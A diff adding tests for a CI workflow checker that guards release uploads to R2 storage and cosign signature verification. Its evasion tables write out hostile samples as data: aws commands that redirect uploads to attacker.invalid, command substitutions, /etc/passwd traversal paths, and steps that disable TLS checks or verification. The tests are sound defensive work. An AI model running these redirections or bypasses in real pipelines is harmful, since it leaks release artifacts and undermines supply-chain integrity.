+	["a command substitution", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$(cat /tmp/e)"', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL"/],
+	["a suffix on the variable", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "${R2_ENDPOINT_URL}.attacker.invalid"', /--endpoint-url must be exactly "\$R2_ENDPOINT_URL"/],
+	["no endpoint at all", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --quiet', /must carry --endpoint-url "\$R2_ENDPOINT_URL" exactly once \(found 0\)/],
+	["two endpoints", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --endpoint-url "$R2_ENDPOINT_URL"', /exactly once \(found 2\)/],
+	["the --endpoint-url=value form", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url=https://attacker.invalid', /carries an option the checker does not allow: --endpoint-url=/],
+	["--profile", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --profile other', /carries an option the checker does not allow: --profile/],
+	["--region other than auto", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --region us-east-1', /--region may only be auto: us-east-1/],
+	["--region from another variable", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --region "$REGION"', /--region may only be auto/],
+	["--no-verify-ssl", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --no-verify-ssl', /carries an option the checker does not allow: --no-verify-ssl/],
+	["--ca-bundle", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --ca-bundle /tmp/ca.pem', /carries an option the checker does not allow: --ca-bundle/],
+	["--debug", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --debug', /carries an option the checker does not allow: --debug/],
+	["--no-sign-request", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --no-sign-request', /carries an option the checker does not allow: --no-sign-request/],
+	["an option from an expansion", 'aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" "$EXTRA"', /exactly one source and one destination|option the checker does not allow/],
+	["a download to another endpoint", 'aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/x --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly/],
+	["a download without an endpoint", 'aws s3 cp "s3://${R2_BUCKET}/${key}" /tmp/x --quiet', /exactly once \(found 0\)/],
+	["head-object to another endpoint", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly/],
+	["head-object without an endpoint", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key"', /exactly once \(found 0\)/],
+	["head-object with --profile", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url "$R2_ENDPOINT_URL" --profile other', /carries an option the checker does not allow: --profile/],
+	["head-object with --no-verify-ssl", 'aws s3api head-object --bucket "$R2_BUCKET" --key "$key" --endpoint-url "$R2_ENDPOINT_URL" --no-verify-ssl', /carries an option the checker does not allow: --no-verify-ssl/],
+	["ls without an endpoint", 'aws s3 ls "s3://${R2_BUCKET}/"', /exactly once \(found 0\)/],
+	["ls to another endpoint", 'aws s3 ls "s3://${R2_BUCKET}/" --endpoint-url https://attacker.invalid', /--endpoint-url must be exactly/],
+	["AWS_ENDPOINT_URL as a prefix", 'AWS_ENDPOINT_URL=https://attacker.invalid aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"', /sets AWS_ENDPOINT_URL, which redirects/],
+	["AWS_ENDPOINT_URL_S3 exported", 'export AWS_ENDPOINT_URL_S3=https://attacker.invalid\naws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"', /sets AWS_ENDPOINT_URL_S3, which redirects/],
+	["AWS_DEFAULT_REGION reassigned", 'AWS_DEFAULT_REGION=us-east-1; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL" --region "$AWS_DEFAULT_REGION"', /reassigns AWS_DEFAULT_REGION/],
+	["R2_ENDPOINT_URL reassigned", 'R2_ENDPOINT_URL=https://attacker.invalid; aws s3 cp artifacts/x "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"', /reassigns R2_ENDPOINT_URL/],
+];
+
+test("every aws invocation in a publish job goes to --endpoint-url \"$R2_ENDPOINT_URL\" and nowhere else (round 5, finding 2)", () => {
+	const options = { artifactDirectories: ["artifacts", "manifest"] };
+	for (const [label, script, pattern] of AWS_ENDPOINT_EVASIONS) {
+		const reasons = [...r2StepReasons("publish-r2", script, options).reasons, ...credentialStepReasons(script, { ...options, jobId: "publish-r2" })];
+		assert.ok(reasons.some((reason) => pattern.test(reason)), `${label}: expected ${pattern}, got:\n${reasons.join("\n")}`);
+	}
+	// The checked-in aws lines all carry the pin.
+	const release = parse(readFileSync(RELEASE, "utf8"));
+	let count = 0;
+	for (const jobId of Object.keys(R2_WRITERS)) {
+		for (const step of release.jobs[jobId].steps ?? []) {
+			for (const command of shellCommands(String(step.run ?? ""))) {
+				const texts = command.words.map((word) => word.text);
+				const at = texts.indexOf("aws");
+				if (at === -1 || command.casePattern) continue;
+				count += 1;
+				const endpoint = texts.indexOf("--endpoint-url", at);
+				assert.ok(endpoint !== -1, `${jobId} ${step.name}: ${texts.join(" ")}`);
+				assert.equal(texts[endpoint + 1], "$R2_ENDPOINT_URL", `${jobId} ${step.name}: ${texts.join(" ")}`);
+			}
+		}
+	}
+	assert.ok(count >= 10, `found ${count} aws invocations`);
+	// The step env may not point the CLI elsewhere either: every AWS_* the R2 steps set is checked.
+	for (const [jobId, name, value, expected] of [
+		["publish-r2", "AWS_ENDPOINT_URL", "https://attacker.invalid", "sets AWS_ENDPOINT_URL, which redirects"],
+		["publish-r2", "AWS_ENDPOINT_URL_S3", "https://attacker.invalid", "sets AWS_ENDPOINT_URL_S3, which redirects"],
+		["publish-beta-r2", "AWS_PROFILE", "other", "sets AWS_PROFILE, which redirects"],
+		["finalize-release", "AWS_CA_BUNDLE", "/tmp/ca.pem", "sets AWS_CA_BUNDLE, which redirects"],
+		["publish-r2", "AWS_DEFAULT_REGION", "us-east-1", "sets AWS_DEFAULT_REGION to 'us-east-1'; R2 only takes the region 'auto'"],
+		["publish-beta-r2", "AWS_REGION", "us-east-1", "sets AWS_REGION, which redirects"],
+	]) {
+		const broken = mutate(RELEASE, (text) => appendStep(text, jobId, `      - name: Redirect the CLI\n        env:\n          ${name}: '${value}'\n        run: echo hi\n`));
+		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && problem.includes(expected)), `${jobId} ${name}=${value}:\n${problems.join("\n")}`);
+	}
+	// Changing the checked-in pin is a workflow failure.
+	for (const [jobId, from, to] of [
+		["publish-r2", '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n              --endpoint-url "$R2_ENDPOINT_URL" \\\n', '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n              --endpoint-url "https://attacker.invalid" \\\n'],
+		["publish-r2", '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n              --endpoint-url "$R2_ENDPOINT_URL" \\\n', '            aws s3 cp "$file" "s3://${R2_BUCKET}/releases/v${PRODUCTION_VERSION}/${name}" \\\n'],
+		["publish-beta-r2", '            aws s3api head-object --bucket "$R2_BUCKET" --key "$key" \\\n              --endpoint-url "$R2_ENDPOINT_URL" >/tmp/head.json', '            aws s3api head-object --bucket "$R2_BUCKET" --key "$key" \\\n              --endpoint-url "$OTHER" >/tmp/head.json'],
+		["finalize-release", '          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" \\\n            --endpoint-url "$R2_ENDPOINT_URL"', '          aws s3 cp artifacts/stable "s3://${R2_BUCKET}/stable" \\\n            --endpoint-url "$R2_ENDPOINT_URL" --profile other'],
+	]) {
+		const broken = mutate(RELEASE, (text) => {
+			const start = text.indexOf(`\n  ${jobId}:\n`);
+			const index = text.indexOf(from, start);
+			assert.ok(index > start, `${jobId} contains the anchor`);
+			return `${text.slice(0, index)}${to}${text.slice(index + from.length)}`;
+		});
+		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+		assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && /--endpoint-url|--profile/.test(problem)), `${jobId}:\n${problems.join("\n")}`);
+	}
+});
+
+for (const jobId of ["publish-r2", "publish-beta-r2", "finalize-release"]) {
+	test(`an aws invocation pointed elsewhere inside ${jobId} is rejected in the workflow (round 5, finding 2)`, () => {
+		for (const [label, script, pattern] of AWS_ENDPOINT_EVASIONS) {
+			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in an endpoint", `set -euo pipefail\n${script}`)));
+			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && pattern.test(problem)), `${label} in ${jobId}: expected ${pattern}, got:\n${problems.join("\n")}`);
+		}
+	});
+}
+
+const SOURCE_PATH_EVASIONS = [
+	["a traversal through the artifact directory", "artifacts/../scripts/x.mjs"],
+	["a traversal after a real file", "artifacts/x/../../etc/passwd"],
+	["a dot segment", "artifacts/./x"],
+	["a leading dot segment", "./artifacts/x"],
+	["a leading slash", "/artifacts/x"],
+	["a tilde", "~/artifacts/x"],
+	["a tilde-user", "~runner/artifacts/x"],
+	["an empty segment", "artifacts//x"],
+	["the directory itself", "artifacts"],
+	["the directory with a trailing slash", "artifacts/"],
+	["a sibling with the same prefix", "artifacts-evil/x"],
+	["a trailing dot-dot", "artifacts/x/.."],
+	["a glob", "artifacts/*"],
+	["a brace expansion", "artifacts/{x,y}"],
+	["a variable", "artifacts/$name"],
+	["a command substitution", "artifacts/$(cat /tmp/n)"],
+];
+
+test("an upload source must be a plainly spelled path inside a downloaded artifact directory (round 5, finding 3)", () => {
+	const directories = ["artifacts", "manifest"];
+	for (const [label, source] of SOURCE_PATH_EVASIONS) {
+		assert.equal(isArtifactPath(source, directories), false, label);
+		const script = `aws s3 cp "${source}" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"`;
+		const { reasons } = r2StepReasons("publish-r2", script, { artifactDirectories: directories });
+		assert.ok(reasons.some((reason) => /uploads something other than a downloaded artifact/.test(reason)), `${label}: got:\n${reasons.join("\n")}`);
+	}
+	for (const fine of ["artifacts/x", "artifacts/SHA256SUMS", "artifacts/prime-agent-1.2.3.tgz", "manifest/github-assets.json", "artifacts/sub/x"]) {
+		assert.equal(isArtifactPath(fine, directories), true, fine);
+	}
+	assert.equal(isArtifactPath("artifacts/x", []), false);
+	// The loop form is held to the same rule: `for file in artifacts/../scripts/*` binds nothing.
+	for (const glob of ["artifacts/../scripts/*", "artifacts/sub/../*", "artifacts/./*", "./artifacts/*", "artifacts//*", "/artifacts/*", "artifacts-evil/*"]) {
+		const script = `for file in ${glob}; do name=$(basename "$file"); aws s3 cp "$file" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/\${name}" --endpoint-url "$R2_ENDPOINT_URL"; done`;
+		const { reasons } = r2StepReasons("publish-r2", script, { artifactDirectories: directories });
+		assert.ok(reasons.some((reason) => /uploads something other than a downloaded artifact/.test(reason)), `${glob}: got:\n${reasons.join("\n")}`);
+	}
+	// The workflow-level check reaches every publish job.
+	for (const jobId of ["publish-r2", "publish-beta-r2", "finalize-release"]) {
+		for (const [label, source] of SOURCE_PATH_EVASIONS) {
+			const broken = mutate(RELEASE, (text) => appendStep(text, jobId, runStep("Sneak in a source", `set -euo pipefail\naws s3 cp "${source}" "s3://\${R2_BUCKET}/releases/v\${PRODUCTION_VERSION}/x" --endpoint-url "$R2_ENDPOINT_URL"`)));
+			const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+			assert.ok(problems.some((problem) => problem.includes(`'${jobId}'`) && /uploads something other than a downloaded artifact|names a configuration or credential file/.test(problem)), `${label} in ${jobId}:\n${problems.join("\n")}`);
+		}
+	}
+});
+
+test("the beta SHA256SUMS is signed and its bundle is verified and published next to it (round 5, finding 4)", () => {
+	const release = parse(readFileSync(RELEASE, "utf8"));
+	const sign = release.jobs[BETA_SIGNATURES.signJob];
+	const publish = release.jobs[BETA_SIGNATURES.publishJob];
+	assert.match(String(sign.if), /needs\.context\.outputs\.publish_beta == 'true'/);
+	assert.match(String(sign.if), /needs\.context\.outputs\.publish_production == 'true'/);
+	assert.ok(sign.steps.some((step) => step.uses?.startsWith("actions/upload-artifact@") && step.with.name === BETA_SIGNATURES.artifact && String(step.with.path).endsWith(`/${BETA_SIGNATURES.bundle}`)));
+	assert.ok(publish.needs.includes(BETA_SIGNATURES.signJob));
+	assert.ok(publish.steps.some((step) => step.uses?.startsWith("actions/download-artifact@") && step.with.name === BETA_SIGNATURES.artifact && step.with.path === "artifacts"));
+	const uploadStep = publish.steps.find((entry) => entry.name === BETA_SIGNATURES.uploadStep);
+	assert.deepEqual(caseSkipPatternsOf(uploadStep.run), ["beta", "beta.json"]);
+	assert.equal(casePatternMatches(uploadStep.run, BETA_SIGNATURES.bundle), false);
+	assert.equal(casePatternMatches("case x in\n  *.sigstore.json) continue ;;\nesac", BETA_SIGNATURES.bundle), true);
+	assert.equal(casePatternMatches("case x in\n  SHA256SUMS.*) exit 1 ;;\nesac", BETA_SIGNATURES.bundle), true);
+	assert.equal(casePatternMatches("case x in\n  *.json) type=application/json ;;\nesac", BETA_SIGNATURES.bundle), false); // a content type, not a skip
+	assert.equal(casePatternMatches("case x in\n  SHA256SUMS.sigstore.json)\n    echo skip\n    continue\n    ;;\nesac", BETA_SIGNATURES.bundle), true);
+	assert.deepEqual(checkWorkflows(), []);
+
+	const variants = [
+		["sign not running for the beta", (text) => text.replace("if: github.event_name != 'pull_request' && (needs.context.outputs.publish_production == 'true' || needs.context.outputs.publish_beta == 'true')", "if: github.event_name != 'pull_request' && needs.context.outputs.publish_production == 'true'"), /'sign' must also run when needs\.context\.outputs\.publish_beta == 'true'/],
+		["the beta bundle artifact renamed", (text) => text.replace("          name: release-beta-signatures\n          path: beta-signatures/SHA256SUMS.sigstore.json\n", "          name: release-beta-sigs\n          path: beta-signatures/SHA256SUMS.sigstore.json\n"), /'sign' must upload an artifact named 'release-beta-signatures'/],
+		["the bundle missing from the artifact", (text) => text.replace("          path: beta-signatures/SHA256SUMS.sigstore.json\n", "          path: beta-signatures/other.json\n"), /artifact 'release-beta-signatures' must contain SHA256SUMS\.sigstore\.json/],
+		["the beta sign step dropped", (text) => text.replace("          cosign sign-blob --yes \\\n            --bundle beta-signatures/SHA256SUMS.sigstore.json \\\n            beta-artifacts/SHA256SUMS\n", "          touch beta-signatures/SHA256SUMS.sigstore.json\n"), /'sign' must run 'cosign sign-blob --yes --bundle <dir>\/SHA256SUMS\.sigstore\.json beta-artifacts\/SHA256SUMS'/],
+		["publish-beta-r2 not needing sign", (text) => text.replace("  publish-beta-r2:\n    name: Publish beta to R2\n    needs: [context, assemble, sign]\n", "  publish-beta-r2:\n    name: Publish beta to R2\n    needs: [context, assemble]\n"), /'publish-beta-r2' must need 'sign'/],
+		["publish-beta-r2 not downloading the bundle", (text) => text.replace("      - name: Download beta signatures\n        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8\n        with:\n          name: release-beta-signatures\n          path: artifacts\n\n", ""), /'publish-beta-r2' must download 'release-final-beta' and 'release-beta-signatures' exactly once each/],
+		["the bundle downloaded somewhere else", (text) => text.replace("          name: release-beta-signatures\n          path: artifacts\n", "          name: release-beta-signatures\n          path: signatures\n"), /must download 'release-beta-signatures' into the same directory as 'release-final-beta'/],
+		["the bundle skipped by the upload loop", (text) => text.replace("            case \"$name\" in\n              beta|beta.json) continue ;;\n            esac\n            key=\"${prefix}/${name}\"", "            case \"$name\" in\n              beta|beta.json|*.sigstore.json) continue ;;\n            esac\n            key=\"${prefix}/${name}\""), /skips SHA256SUMS\.sigstore\.json/],
+		["the bundle skipped by an exit", (text) => text.replace("            case \"$name\" in\n              beta|beta.json) continue ;;\n            esac\n            key=\"${prefix}/${name}\"", "            case \"$name\" in\n              beta|beta.json) continue ;;\n              SHA256SUMS.sigstore.json) echo no; exit 0 ;;\n            esac\n            key=\"${prefix}/${name}\""), /skips SHA256SUMS\.sigstore\.json/],
+		["the verify step dropped", (text) => text.replace("          cosign verify-blob \\\n            --bundle artifacts/SHA256SUMS.sigstore.json \\\n            --certificate-oidc-issuer https://token.actions.githubusercontent.com \\\n            --certificate-identity \"https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@refs/heads/${DEFAULT_BRANCH}\" \\\n            artifacts/SHA256SUMS\n", "          echo skipping verification\n"), /'publish-beta-r2' must run 'cosign verify-blob --bundle artifacts\/SHA256SUMS\.sigstore\.json/],
+		["the verify identity loosened to any ref", (text) => text.replace('--certificate-identity "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@refs/heads/${DEFAULT_BRANCH}" \\\n            artifacts/SHA256SUMS', '--certificate-identity-regexp "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@.*" \\\n            artifacts/SHA256SUMS'), /'publish-beta-r2' must run 'cosign verify-blob/],
+		["the verify identity pointing at the standalone workflow", (text) => text.replace('--certificate-identity "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/build-binaries.yml@refs/heads/${DEFAULT_BRANCH}" \\\n            artifacts/SHA256SUMS', '--certificate-identity "https://github.com/${GITHUB_REPOSITORY}/.github/workflows/standalone-binaries.yml@refs/heads/${DEFAULT_BRANCH}" \\\n            artifacts/SHA256SUMS'), /'publish-beta-r2' must run 'cosign verify-blob/],
+		["the verify issuer changed", (text) => text.replace("            --bundle artifacts/SHA256SUMS.sigstore.json \\\n            --certificate-oidc-issuer https://token.actions.githubusercontent.com \\", "            --bundle artifacts/SHA256SUMS.sigstore.json \\\n            --certificate-oidc-issuer https://accounts.google.com \\"), /'publish-beta-r2' must run 'cosign verify-blob/],
+		["the verify step after the upload", (text) => {
+			const start = text.indexOf("      - name: Verify the beta signature bundle against the pinned release identity\n");
+			const end = text.indexOf("      - name: Upload immutable beta objects\n");
+			const verify = text.slice(start, end);
+			const anchor = "      - name: Check that this is still the head of the default branch\n";
+			return `${text.slice(0, start)}${text.slice(end).replace(anchor, `${verify}${anchor}`)}`;
+		}, /'publish-beta-r2' must verify the beta bundle before 'Upload immutable beta objects'/],
+		["DEFAULT_BRANCH pointing elsewhere", (text) => text.replace("      BUILD_REF: ${{ needs.context.outputs.build_ref }}\n      DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}\n    steps:\n      # The nightly credential", "      BUILD_REF: ${{ needs.context.outputs.build_ref }}\n      DEFAULT_BRANCH: ${{ github.head_ref }}\n    steps:\n      # The nightly credential"), /'publish-beta-r2' must set DEFAULT_BRANCH to \$\{\{ github\.event\.repository\.default_branch \}\}/],
+	];
+	for (const [label, mutateText, pattern] of variants) {
+		const broken = mutate(RELEASE, mutateText);
+		const problems = checkWorkflows(reader({ [RELEASE]: broken }));
+		assert.ok(problems.some((problem) => pattern.test(problem)), `${label}: expected ${pattern}, got:\n${problems.join("\n")}`);
+	}
 });
